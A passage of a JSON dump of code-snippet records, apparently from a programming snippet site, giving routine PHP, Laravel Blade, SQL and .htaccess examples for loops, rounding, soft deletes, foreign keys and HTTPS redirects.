    "description": "echo(floor(0.60) . \"<br>\"); // 0 echo(floor(0.40) . \"<br>\"); // 0 echo(floor(5) . \"<br>\"); // 5 echo(floor(5.1) . \"<br>\"); //5 echo(floor(-5.1) . \"<br>\"); // -6 echo(floor(-5.9)); // -6  echo(ceil(0.60) . \"<br>\"); // 1 echo(ceil(0.40) . \"<br>\"); // 1 echo(ceil(5) . \"<br>\"); // 5 echo(ceil(5.1) . \"<br>\"); // 6 echo(ceil(-5.1) . \"<br>\"); // -5 echo(ceil(-5.9)); // -5\n <?php echo 'Rounding modes with 9.5' . PHP_EOL; var_dump(round(9.5, 0, PHP_ROUND_HALF_UP)); var_dump(round(9.5, 0, PHP_ROUND_HALF_DOWN)); var_dump(round(9.5, 0, PHP_ROUND_HALF_EVEN)); var_dump(round(9.5, 0, PHP_ROUND_HALF_ODD));  echo 'Rounding modes with 8.5' . PHP_EOL; var_dump(round(8.5, 0, PHP_ROUND_HALF_UP)); var_dump(round(8.5, 0, PHP_ROUND_HALF_DOWN)); var_dump(round(8.5, 0, PHP_ROUND_HALF_EVEN)); var_dump(round(8.5, 0, PHP_ROUND_HALF_ODD)); ?>  \n",
    "reg_date": "2021-10-12T10:13:56.000Z"
  },
  {
    "id": 1159,
    "keyword": null,
    "link": null,
    "title": " fluid inline if",
    "description": "{f:if(condition: '{variable}', then: 'gesetzt', else: 'nicht-gesetzt')} \n",
    "reg_date": "2021-10-12T10:13:57.000Z"
  },
  {
    "id": 1160,
    "keyword": null,
    "link": null,
    "title": " focus next input",
    "description": "<?php  <div class=\"row\">   <div class=\"col-xs-2\">     <?= $this->Form->input('number_one', array(       'label' => false,       'class' => 'form-control number_one' ,       'maxlength' => \"1\" ,       'oninput' => \"this.value=this.value.replace(/[^0-9]/g,'');\"     ));?>     </div>  <div class=\"col-xs-2\">   <?= $this->Form->input('number_two', array(     'label' => false,     'class' => 'form-control number_two ' ,     'maxlength' => \"1\" ,     'oninput' => \"this.value=this.value.replace(/[^0-9]/g,'');\"   ));?>   </div>  <div class=\"col-xs-2\">   <?= $this->Form->input('number_three', array(     'label' => false,     'class' => 'form-control number_three' ,     'maxlength' => \"1\" ,     'oninput' => \"this.value=this.value.replace(/[^0-9]/g,'');\"   ));?>   </div>  <div class=\"col-xs-2\">   <?= $this->Form->input('number_four', array(   'label' => false,   'class' => 'form-control number_four' ,   'maxlength' => \"1\" ,   'oninput' => \"this.value=this.value.replace(/[^0-9]/g,'');\" ));?>   </div>  <div class=\"col-xs-2\">   <?= $this->Form->input('number_five', array(     'label' => false,     'class' => 'form-control number_five' ,     'maxlength' => \"1\" ,     'oninput' => \"this.value=this.value.replace(/[^0-9]/g,'');\"   ));?>   </div>  <div class=\"col-xs-2\">   <?= $this->Form->input('number_six', array(     'label' => false,     'class' => 'form-control number_six',     'maxlength' => \"1\" ,     'oninput' => \"this.value=this.value.replace(/[^0-9]/g,'');\"   ));?>   </div> </div> ?>     <script>      $(function() {     next_focus($('.number_one'),  $('.number_two'));     next_focus($('.number_two'),  $('.number_three'));     next_focus($('.number_three'),  $('.number_four'));     next_focus($('.number_four'),  $('.number_five'));     next_focus($('.number_five'),  $('.number_six'));       function next_focus(input1, input2) {       input1.keyup(function(){         if(this.value.length == $(this).attr(\"maxlength\")){           input2.focus();         }       });     }   }  </script>\n",
    "reg_date": "2021-10-12T10:13:57.000Z"
  },
  {
    "id": 1161,
    "keyword": null,
    "link": null,
    "title": " fopen(F:\\xampp\\htdocs\\Escubydu\\storage\\fonts//themify normal f60486608aadd4e36c92c9895f99838f.ufm): failed to open stream: No such file or directory",
    "description": "public function pdf()  {      $pdf = \\PDF::loadView('contact')->setOptions(['defaultFont' => 'sans-serif']);               return $pdf->download('invoice.pdf');  }\n",
    "reg_date": "2021-10-12T10:13:57.000Z"
  },
  {
    "id": 1162,
    "keyword": null,
    "link": null,
    "title": " for ($i=0, $len=count($",
    "description": " <?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>  \n",
    "reg_date": "2021-10-12T10:13:57.000Z"
  },
  {
    "id": 1163,
    "keyword": null,
    "link": null,
    "title": " for each multiple php",
    "description": "foreach($_POST['an_array'] as $key => $an_array) { \t$another_array = $_POST['another_array'][$key];   \t\t//do whatevercrap you wanna do }\n",
    "reg_date": "2021-10-12T10:13:57.000Z"
  },
  {
    "id": 1164,
    "keyword": null,
    "link": null,
    "title": " for each php",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\nforeach (array_expression as $value)     statement foreach (array_expression as $key => $value)     statement \n <?php $arr = array(1, 2, 3, 4); foreach ($arr as &$value) {     $value = $value * 2; } // $arr is now array(2, 4, 6, 8)  // without an unset($value), $value is still a reference to the last item: $arr[3]  foreach ($arr as $key => $value) {     // $arr[3] will be updated with each value from $arr...     echo \"{$key} => {$value} \";     print_r($arr); } // ...until ultimately the second-to-last value is copied onto the last value  // output: // 0 => 2 Array ( [0] => 2, [1] => 4, [2] => 6, [3] => 2 ) // 1 => 4 Array ( [0] => 2, [1] => 4, [2] => 6, [3] => 4 ) // 2 => 6 Array ( [0] => 2, [1] => 4, [2] => 6, [3] => 6 ) // 3 => 6 Array ( [0] => 2, [1] => 4, [2] => 6, [3] => 6 ) ?>  \n <?php $arr = array(1, 2, 3, 4); foreach ($arr as &$value) {     $value = $value * 2; } // $arr is now array(2, 4, 6, 8) unset($value); // break the reference with the last element ?>  \n <?php foreach (array(1, 2, 3, 4) as &$value) {     $value = $value * 2; } ?>  \n <?php $array = [     [1, 2],     [3, 4], ];  foreach ($array as list($a, $b)) {     // $a contains the first element of the nested array,     // and $b contains the second element.     echo \"A: $a; B: $b\\n\"; } ?>  \n",
    "reg_date": "2021-10-12T10:13:57.000Z"
  },
  {
    "id": 1165,
    "keyword": null,
    "link": null,
    "title": " for else laravel",
    "description": "@if (foo)   // do something @elseif (bar)   // do something else @else   // do some other thing; @endif\n@if($user->status =='active')                <td>{{ $user->name }}</td>          @else       <td> Guest </td>         @endif\n@foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse\n",
    "reg_date": "2021-10-12T10:13:57.000Z"
  },
  {
    "id": 1166,
    "keyword": null,
    "link": null,
    "title": " for i php",
    "description": "<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor($i=0;$i<count($fruits);$i++){     echo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     }   ?>\n <?php /* example 1 */  for ($i = 1; $i <= 10; $i++) {     echo $i; }  /* example 2 */  for ($i = 1; ; $i++) {     if ($i > 10) {         break;     }     echo $i; }  /* example 3 */  $i = 1; for (; ; ) {     if ($i > 10) {         break;     }     echo $i;     $i++; }  /* example 4 */  for ($i = 1, $j = 0; $i <= 10; $j += $i, print $i, $i++); ?>  \nfor($i = 0; $i <=10; $i++){ \techo \"The index is $i\"; }\n<?php      for ($i = 1; $i <= 10; $i++) {     echo $i;   }\n<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor ($i = 0; $i < count($fruits); $i++) {       \techo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     } \t// or \t$i = 0; \tforeach ($fruits as $value) {     \techo \"Index of \".$i.\"= \".$value.\"<br>\";       \t$i++; \t} ?>\n",
    "reg_date": "2021-10-12T10:13:57.000Z"
  },
  {
    "id": 1167,
    "keyword": null,
    "link": null,
    "title": " for loop in ACF",
    "description": "<?php if( have_rows('slides') ): ?>     <ul class=\"slides\">     <?php while( have_rows('slides') ): the_row();          $image = get_sub_field('image');         ?>         <li>             <?php echo wp_get_attachment_image( $image, 'full' ); ?>             <p><?php the_sub_field('caption'); ?></p>         </li>     <?php endwhile; ?>     </ul> <?php endif; ?>\n<?php  $rows = get_field('repeater_field_name'); if( $rows ) {     echo '<ul class=\"slides\">';     foreach( $rows as $row ) {         $image = $row['image'];         echo '<li>';             echo wp_get_attachment_image( $image, 'full' );             echo wpautop( $row['caption'] );         echo '</li>';     }     echo '</ul>'; }\n",
    "reg_date": "2021-10-12T10:13:57.000Z"
  },
  {
    "id": 1168,
    "keyword": null,
    "link": null,
    "title": " for loop in php",
    "description": "<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor($i=0;$i<count($fruits);$i++){     echo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     }   ?>\n <?php /* example 1 */  for ($i = 1; $i <= 10; $i++) {     echo $i; }  /* example 2 */  for ($i = 1; ; $i++) {     if ($i > 10) {         break;     }     echo $i; }  /* example 3 */  $i = 1; for (; ; ) {     if ($i > 10) {         break;     }     echo $i;     $i++; }  /* example 4 */  for ($i = 1, $j = 0; $i <= 10; $j += $i, print $i, $i++); ?>  \n/* For loop in php */  <?php for ($i = 0; $i < 10; $i++) {      echo $i.\"<br>\"; }  ?>\nfor($i = 0; $i <=10; $i++){ \techo \"The index is $i\"; }\n<?php      for ($i = 1; $i <= 10; $i++) {     echo $i;   }\n<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor ($i = 0; $i < count($fruits); $i++) {       \techo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     } \t// or \t$i = 0; \tforeach ($fruits as $value) {     \techo \"Index of \".$i.\"= \".$value.\"<br>\";       \t$i++; \t} ?>\n",
    "reg_date": "2021-10-12T10:13:58.000Z"
  },
  {
    "id": 1169,
    "keyword": null,
    "link": null,
    "title": " for loop php",
    "description": "<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor($i=0;$i<count($fruits);$i++){     echo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     }   ?>\n <?php /* example 1 */  for ($i = 1; $i <= 10; $i++) {     echo $i; }  /* example 2 */  for ($i = 1; ; $i++) {     if ($i > 10) {         break;     }     echo $i; }  /* example 3 */  $i = 1; for (; ; ) {     if ($i > 10) {         break;     }     echo $i;     $i++; }  /* example 4 */  for ($i = 1, $j = 0; $i <= 10; $j += $i, print $i, $i++); ?>  \n/* For loop in php */  <?php for ($i = 0; $i < 10; $i++) {      echo $i.\"<br>\"; }  ?>\nfor($i = 0; $i <=10; $i++){ \techo \"The index is $i\"; }\n<?php      for ($i = 1; $i <= 10; $i++) {     echo $i;   }\n<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor ($i = 0; $i < count($fruits); $i++) {       \techo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     } \t// or \t$i = 0; \tforeach ($fruits as $value) {     \techo \"Index of \".$i.\"= \".$value.\"<br>\";       \t$i++; \t} ?>\n",
    "reg_date": "2021-10-12T10:13:58.000Z"
  },
  {
    "id": 1170,
    "keyword": null,
    "link": null,
    "title": " for loop php continue to next item",
    "description": "$stack = array('first', 'second', 'third', 'fourth', 'fifth');  foreach($stack as $v){     if($v == 'second') {       continue;     }     echo $v.'<br>'; } /* first third fourth fifth */ \n",
    "reg_date": "2021-10-12T10:13:58.000Z"
  },
  {
    "id": 1171,
    "keyword": null,
    "link": null,
    "title": " for loop php increment by 2",
    "description": " for ($i=1; $i <=10; $i+=2)  {      echo $i.'<br>'; }\n",
    "reg_date": "2021-10-12T10:13:58.000Z"
  },
  {
    "id": 1172,
    "keyword": null,
    "link": null,
    "title": " for php",
    "description": "<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor($i=0;$i<count($fruits);$i++){     echo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     }   ?>\n <?php /* example 1 */  for ($i = 1; $i <= 10; $i++) {     echo $i; }  /* example 2 */  for ($i = 1; ; $i++) {     if ($i > 10) {         break;     }     echo $i; }  /* example 3 */  $i = 1; for (; ; ) {     if ($i > 10) {         break;     }     echo $i;     $i++; }  /* example 4 */  for ($i = 1, $j = 0; $i <= 10; $j += $i, print $i, $i++); ?>  \n/* For loop in php */  <?php for ($i = 0; $i < 10; $i++) {      echo $i.\"<br>\"; }  ?>\nfor($i = 0; $i <=10; $i++){ \techo \"The index is $i\"; }\n<?php      for ($i = 1; $i <= 10; $i++) {     echo $i;   }\n<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor ($i = 0; $i < count($fruits); $i++) {       \techo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     } \t// or \t$i = 0; \tforeach ($fruits as $value) {     \techo \"Index of \".$i.\"= \".$value.\"<br>\";       \t$i++; \t} ?>\n",
    "reg_date": "2021-10-12T10:13:58.000Z"
  },
  {
    "id": 1173,
    "keyword": null,
    "link": null,
    "title": " force delete soft delete laravel",
    "description": "Soft Delete : $user->delete(); Force Delete : $user->forceDelete(); Restore Soft Deleted Item : $user->restore();\n/** in migrations this changes need to     add for table we want to add soft delete (LARAVEL)*/  \t/** The migrations. START */ \tpublic function up() \t{ \t\tSchema::table('users', function(Blueprint $table) \t\t{ \t\t\t$table->softDeletes(); \t\t}); \t} \t/** The migrations. END */  \t/** after adding softdelete you need to     point that column in table related model (LARAVEL)*/  \t/** The Model. START */   \tuse Illuminate\\Database\\Eloquent\\SoftDeletes;   \tclass User extends Model { \t  use SoftDeletes; \t  protected $dates = ['deleted_at']; \t} \t/** The Model. END */\nSchema::table('flights', function (Blueprint $table) {     $table->softDeletes(); });\n",
    "reg_date": "2021-10-12T10:13:58.000Z"
  },
  {
    "id": 1174,
    "keyword": null,
    "link": null,
    "title": " force https redirection laravel",
    "description": "// app/Providers/AppServiceProvider.php URL::forceScheme('https'); \n<Files .env> Order allow,deny Deny from all </Files>  <Files composer.json> Order allow,deny Deny from all </Files>  <IfModule mod_rewrite.c> <IfModule mod_negotiation.c> Options -MultiViews -Indexes </IfModule>  <IfModule mod_rewrite.c> <IfModule mod_negotiation.c> Options -MultiViews -Indexes </IfModule>  RewriteEngine On  # Handle Authorization Header RewriteCond %{HTTP:Authorization} . RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]  # Redirect Trailing Slashes If Not A Folder... RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_URI} (.+)/$ RewriteRule ^ %1 [L,R=301]  # Send Requests To Front Controller... RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ index.php [L] </IfModule>   <IfModule mod_rewrite.c> RewriteEngine On         RewriteCond %{HTTPS} !=on     RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301] RewriteRule ^(.*)$ public/ [L] </IfModule>\nRewriteEngine On  RewriteCond %{SERVER_PORT} 80  RewriteRule ^(.*)$ https://www.yourdomain.com/$1 [R,L]\n",
    "reg_date": "2021-10-12T10:13:58.000Z"
  },
  {
    "id": 1175,
    "keyword": null,
    "link": null,
    "title": " force https with php",
    "description": "if($_SERVER[\"HTTPS\"] != \"on\") {     header(\"Location: https://\" . $_SERVER[\"HTTP_HOST\"] . $_SERVER[\"REQUEST_URI\"]);     exit(); }\n",
    "reg_date": "2021-10-12T10:13:58.000Z"
  },
  {
    "id": 1176,
    "keyword": null,
    "link": null,
    "title": " fore install debian 10 php 7.3",
    "description": "sudo apt install -y php7.4 php7.4-cli php7.4-common\nsudo apt -y install php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath\nsudo apt -y install libapache2-mod-php\n",
    "reg_date": "2021-10-12T10:13:58.000Z"
  },
  {
    "id": 1177,
    "keyword": null,
    "link": null,
    "title": " foreach comma separated string php",
    "description": "$variable = 'value1, value2, value3, value4, value5';    $var=explode(',',$variable);    foreach($var as row)     {     //do your code here     }\n",
    "reg_date": "2021-10-12T10:13:58.000Z"
  },
  {
    "id": 1178,
    "keyword": null,
    "link": null,
    "title": " foreach date php",
    "description": "$begin = new DateTime( \"2015-07-03\" ); $end   = new DateTime( \"2015-07-09\" );  for($i = $begin; $i <= $end; $i->modify('+1 day')){     echo $i->format(\"Y-m-d\"); }\n$begin = new DateTime( \"2015-07-03\" ); $end   = new DateTime( \"2015-07-09\" );  for($i = $begin; $i <= $end; $i->modify('+1 day')){     echo $i->format(\"Y-m-d\"); } \n$begin = new DateTime('2010-05-01'); $end = new DateTime('2010-05-10');  $interval = DateInterval::createFromDateString('1 day'); $period = new DatePeriod($begin, $interval, $end);  foreach ($period as $dt) {     echo $dt->format(\"l Y-m-d H:i:s\\n\"); } \n",
    "reg_date": "2021-10-12T10:13:59.000Z"
  },
  {
    "id": 1179,
    "keyword": null,
    "link": null,
    "title": " foreach empty laravel",
    "description": "@forelse($status->replies as $reply)     <p>{{ $reply->body }}</p> @empty     <p>No replies</p> @endforelse    Check the documentation for the best result:   http://laravel.com/docs/5.1/blade#control-structures\npublic function index()  {      $products = Product::get();      return view('home',compact('products'));  }  <div class=\"card-header\">      <h5>Laravel Check Array Empty in Blade </h5>  </div>  <div class=\"card-body\">      @forelse ($products as $product)          <p class=\"bg-danger text-white p-1\">product</p>      @empty          <p class=\"bg-danger text-white p-1\">No product</p>      @endforelse  </div> \n",
    "reg_date": "2021-10-12T10:13:59.000Z"
  },
  {
    "id": 1180,
    "keyword": null,
    "link": null,
    "title": " foreach in laravel",
    "description": "@for ($i = 0; $i < 10; $i++)     The current value is {{ $i }} @endfor  @foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse  @while (true)     <p>I'm looping forever.</p> @endwhile\nforeach($data as $key => $value) { \tdd($value); }\nforeach ($users as $user) {     // stuff here }\nforeach ($product as $p) { \techo $p->sku; }\n$loop->index Returns a 0-based current loop iteration; 0 would mean the first iteration $loop->iteration Returns a 1-based current loop iteration; 1 would mean the first iteration $loop->remaining Number of iterations remaining in the loop; if there are a total of 10 iterations and the current iteration is 3, it would return 7 $loop->count Returns the total number of iterations or the total number of items in the array $loop->first Returns true if it is the first iteration or item in the loop else returns false. $loop->last Returns true if it is the last iteration or item in the loop else return false. $loop->depth Returns the depth or nesting level of the current loop; returns 2 if it is a loop within a loop and 3 if it is nested one level more $loop->parentIf this loop is nested within another @foreach loop, parent returns the parent&rsquo;s loop\n@foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse \n",
    "reg_date": "2021-10-12T10:13:59.000Z"
  },
  {
    "id": 1181,
    "keyword": null,
    "link": null,
    "title": " foreach in php",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\n$arr = ['Item 1', 'Item 2', 'Item 3'];  foreach ($arr as $item) {   var_dump($item); }\n<?php $food = array('burger','pizza','golgappa','momoes'); foreach($food as $value) {     echo $value,\"<br>\"; } ?>\n$arr = array( \t'key1' => 'val', \t'key2' => 'another', \t'another' => 'more stuff'  ); foreach ($arr as $key => $val){ \t//do stuff }  //or alt syntax foreach ($arr as $key => $val) :    //do stuff here as well endforeach;\n<?php // Declare an array  $arr = array(\"green\", \"blue\", \"pink\", \"white\");      // Loop through the array elements  foreach ($arr as $element) {      echo \"$element \";  }  ?>\n$arr = array( \t'key1' => 'val', \t'key2' => 'another', \t'another' => 'more stuff'  ); foreach ($arr as $key => $val){ \t//do stuff }  //or alt syntax foreach ($arr as $key => $val) :    //do stuff here as well endforeach; \n",
    "reg_date": "2021-10-12T10:13:59.000Z"
  },
  {
    "id": 1182,
    "keyword": null,
    "link": null,
    "title": " foreach loop 1-100 php",
    "description": "<?php  for ($i = 0; $i < 10; $i++){  $product = 10 * $i;  echo \"The product of 10 * $i is $product <br/>\"; }  ?>\n",
    "reg_date": "2021-10-12T10:13:59.000Z"
  },
  {
    "id": 1183,
    "keyword": null,
    "link": null,
    "title": " foreach loop array php",
    "description": "foreach (array as $value){    //code to be executed;    print(\"value : $value\"); }   foreach (array as  $key => $value){    //code to be executed;    print(\"key[$key] => $value\"); } \nforeach (array_expression as $value)     statement foreach (array_expression as $key => $value)     statement\n<?php // Declare an array  $arr = array(\"green\", \"blue\", \"pink\", \"white\");      // Loop through the array elements  foreach ($arr as $element) {      echo \"$element \";  }  ?>\n$arr = array( \t'key1' => 'val', \t'key2' => 'another', \t'another' => 'more stuff'  ); foreach ($arr as $key => $val){ \t//do stuff }  //or alt syntax foreach ($arr as $key => $val) :    //do stuff here as well endforeach; \n",
    "reg_date": "2021-10-12T10:13:59.000Z"
  },
  {
    "id": 1184,
    "keyword": null,
    "link": null,
    "title": " foreach loop in laravel",
    "description": "@foreach($array as $element)      @endforeach\n@for ($i = 0; $i < 10; $i++)     The current value is {{ $i }} @endfor  @foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse  @while (true)     <p>I'm looping forever.</p> @endwhile\n<ul> @foreach ($pages as $page)     <li>{{ $loop->iteration }}: {{ $page->title }}         @if ($page->hasChildren())         <ul>         @foreach ($page->children() as $child)             <li>{{ $loop->parent->iteration }}.{{ $loop->iteration }}:                 {{ $child->title }}</li>         @endforeach         </ul>         @endif     </li> @endforeach </ul>\nforeach($data as $key => $value) { \tdd($value); }\nforeach ($users as $user) {     // stuff here }\nforeach ($product as $p) { \techo $p->sku; }\n",
    "reg_date": "2021-10-12T10:13:59.000Z"
  },
  {
    "id": 1185,
    "keyword": null,
    "link": null,
    "title": " foreach loop in php",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\n$arr = array(1, 2, 3, 4); foreach ($arr as &$value) {     $value = $value * 2; }\n$arr = ['Item 1', 'Item 2', 'Item 3'];  foreach ($arr as $item) {   var_dump($item); }\n<?php $food = array('burger','pizza','golgappa','momoes'); foreach($food as $value) {     echo $value,\"<br>\"; } ?>\n<?php $arr = ['Item 1', 'Item 2', 'Item 3'];  foreach ($arr as $item) {   var_dump($item); }  $dict = array(\"key1\"=>\"35\", \"key2\"=>\"37\", \"key3\"=>\"43\");  foreach($dict as $key => $val) {   echo \"$key = $val<br>\"; } ?>\nforeach (array as $value){    //code to be executed;    print(\"value : $value\"); }   foreach (array as  $key => $value){    //code to be executed;    print(\"key[$key] => $value\"); } \n",
    "reg_date": "2021-10-12T10:13:59.000Z"
  },
  {
    "id": 1186,
    "keyword": null,
    "link": null,
    "title": " foreach loop laravel",
    "description": "@foreach($array as $element)      @endforeach\nforeach($data as $key => $value) { \tdd($value); }\nforeach ($users as $user) {     // stuff here }\n",
    "reg_date": "2021-10-12T10:13:59.000Z"
  },
  {
    "id": 1187,
    "keyword": null,
    "link": null,
    "title": " foreach ph",
    "description": "<?php $age = array(\"Peter\"=>\"35\", \"Ben\"=>\"37\", \"Joe\"=>\"43\");  foreach($age as $x => $val) {   echo \"$x = $val<br>\"; } ?>\n$arr = array( \t'key1' => 'val', \t'key2' => 'another', \t'another' => 'more stuff'  ); foreach ($arr as $key => $val){ \t//do stuff }  //or alt syntax foreach ($arr as $key => $val) :    //do stuff here as well endforeach;\n$arr = array( \t'key1' => 'val', \t'key2' => 'another', \t'another' => 'more stuff'  ); foreach ($arr as $key => $val){ \t//do stuff }  //or alt syntax foreach ($arr as $key => $val) :    //do stuff here as well endforeach; \n <?php  $a = array(1, 2, 3, 17);  foreach ($a as $index => $v) {     echo \"Current value of \\$a: $v.\\n\"; }  ?>  \n <?php $arr = array(1, 2, 3, 4); foreach ($arr as &$value) {     $value = $value * 2; } // $arr is now array(2, 4, 6, 8) unset($value); // break the reference with the last element ?>  \n",
    "reg_date": "2021-10-12T10:14:00.000Z"
  },
  {
    "id": 1188,
    "keyword": null,
    "link": null,
    "title": " foreach php",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\n$arr = array(1, 2, 3, 4); foreach ($arr as &$value) {     $value = $value * 2; }\nfor ($i = 0; $i < count($array); $i++) {     echo $array[$i]['filename'];     echo $array[$i]['filepath']; }\n$arr = ['Item 1', 'Item 2', 'Item 3'];  foreach ($arr as $item) {   var_dump($item); }\nforeach (array_expression as $value)     statement foreach (array_expression as $key => $value)     statement \n $userDetails = array(     \"name\" => \"Salam Ali Ahasan\",     \"education\" => \"MSC\",     \"email\" => \"oti.007@gmail.com\",    \"skills\" => \"Php\",    \"experience\" => \"7 years\",    \"location\" => \"Dhaka, Bangladesh\",     \"profession\" => \"Programmer\" );   if(isset($userDetails)){               foreach ($userDetails as $userDetailsValue) {           echo $name=$userDetailsValue['name'];           echo $education=$userDetailsValue['education'];           echo $email=$userDetailsValue['email'];           echo $skills=$userDetailsValue['skills'];           echo $experience=$userDetailsValue['experience'];           echo $location=$userDetailsValue['location'];           echo $profession=$userDetailsValue['profession'];               }             }\n",
    "reg_date": "2021-10-12T10:14:00.000Z"
  },
  {
    "id": 1189,
    "keyword": null,
    "link": null,
    "title": " foreach range php",
    "description": " <?php    foreach (range(0, 12) as $number) {     echo $number; }  ?>\n",
    "reg_date": "2021-10-12T10:14:00.000Z"
  },
  {
    "id": 1190,
    "keyword": null,
    "link": null,
    "title": " foreach skip current iteration",
    "description": "// You can skip the current iteration using \"continue\" // Example: Skip the current iteration if $number is 3; $numbers = [1, 2, 3, 4, 5];  foreach($numbers as $number) { \tif($number == 3) {     \tcontinue;     } \techo $number . \" + \"; } // output: 1 + 2 + 4 + 5 +\n",
    "reg_date": "2021-10-12T10:14:00.000Z"
  },
  {
    "id": 1191,
    "keyword": null,
    "link": null,
    "title": " foreach skip first php",
    "description": "foreach(array_slice($arr,1) as $key=>$value) {     echo $value; } \n",
    "reg_date": "2021-10-12T10:14:00.000Z"
  },
  {
    "id": 1192,
    "keyword": null,
    "link": null,
    "title": " foreach stdclass object php",
    "description": "foreach ($this->_daoh->listar() as $intIndex => $objRecord) {      print \"$intIndex => {$objRecord->name}\\\"; }\n",
    "reg_date": "2021-10-12T10:14:00.000Z"
  },
  {
    "id": 1193,
    "keyword": null,
    "link": null,
    "title": " foreign id laravel migration",
    "description": "$table->unsignedBigInteger('user_id'); $table->foreign('user_id')->references('id')->on('users')->onDelete('cascade');\n$table->foreign('column_name')->references('id')->on('table_name')->onDelete('cascade');\n$table->foreignId('post_id')                 ->constrained()                 ->onUpdate('cascade')                 ->onDelete('cascade');\n",
    "reg_date": "2021-10-12T10:14:00.000Z"
  },
  {
    "id": 1194,
    "keyword": null,
    "link": null,
    "title": " foreign key constraint is incorrectly formed laravel",
    "description": "When creating a new table in Laravel. A migration will be generated like: $table->bigIncrements('id');  Instead of (in older Laravel versions: $table->increments('id');\n",
    "reg_date": "2021-10-12T10:14:00.000Z"
  },
  {
    "id": 1195,
    "keyword": null,
    "link": null,
    "title": " foreign key in laravel migration",
    "description": "$table->unsignedBigInteger('user_id'); $table->foreign('user_id')->references('id')->on('users')->onDelete('cascade');\nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\nuse Illuminate\\Database\\Schema\\Blueprint; use Illuminate\\Support\\Facades\\Schema;  Schema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\n",
    "reg_date": "2021-10-12T10:14:00.000Z"
  },
  {
    "id": 1196,
    "keyword": null,
    "link": null,
    "title": " foreign key in php",
    "description": "CREATE TABLE Orders (     OrderID int NOT NULL,     OrderNumber int NOT NULL,     PersonID int,     PRIMARY KEY (OrderID),     CONSTRAINT FK_PersonOrder FOREIGN KEY (PersonID)     REFERENCES Persons(PersonID) );\n",
    "reg_date": "2021-10-12T10:14:01.000Z"
  },
  {
    "id": 1197,
    "keyword": null,
    "link": null,
    "title": " foreign key laravel migration",
    "description": "$table->unsignedBigInteger('user_id'); $table->foreign('user_id')->references('id')->on('users')->onDelete('cascade');\nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\n$table->foreign('column_name')->references('id')->on('table_name')->onDelete('cascade');\nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\n$table->string('foo')->nullable(false)->change();\nuse Illuminate\\Database\\Schema\\Blueprint; use Illuminate\\Support\\Facades\\Schema;  Schema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\n",
    "reg_date": "2021-10-12T10:14:01.000Z"
  },
  {
    "id": 1198,
    "keyword": null,
    "link": null,
    "title": " forelse laravel",
    "description": "@if (foo)   // do something @elseif (bar)   // do something else @else   // do some other thing; @endif\n@forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse\n@foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse\npublic function index()  {      $products = Product::get();      return view('home',compact('products'));  }  <div class=\"card-header\">      <h5>Laravel Check Array Empty in Blade </h5>  </div>  <div class=\"card-body\">      @forelse ($products as $product)          <p class=\"bg-danger text-white p-1\">product</p>      @empty          <p class=\"bg-danger text-white p-1\">No product</p>      @endforelse  </div>\n@foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse \n@include('view.name', ['status' => 'complete'])\n",
    "reg_date": "2021-10-12T10:14:01.000Z"
  },
  {
    "id": 1199,
    "keyword": null,
    "link": null,
    "title": " forenkey set inlaravel 8",
